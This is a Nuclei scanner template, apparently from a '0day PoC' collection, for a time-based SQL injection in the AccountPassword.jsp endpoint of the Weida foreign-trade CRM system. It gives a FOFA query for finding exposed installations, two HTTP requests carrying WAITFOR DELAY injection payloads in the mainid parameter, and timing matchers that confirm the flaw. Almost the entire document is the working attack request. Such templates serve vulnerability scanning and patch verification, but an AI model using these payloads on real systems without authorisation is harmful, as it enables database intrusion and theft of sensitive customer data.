id: weida-crm-accountpassword-sqli
info:
  name: "维达外贸客户关系管理系统 AccountPassword 接口 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="维达外贸客户关系管理系统"
      该系统AccountPassword接口存在SQL注入安全缺陷，攻击者可通过构造恶意SQL语句实现数据库查询操控，可能导致敏感数据泄露或数据完整性受损。
  tags: 维达外贸客户关系管理系统
http:
- raw:
  - |
    GET /wap/common/admin/AccountPassword.jsp?mainid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
  - |
    GET /wap/common/admin/AccountPassword.jsp?mainid=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
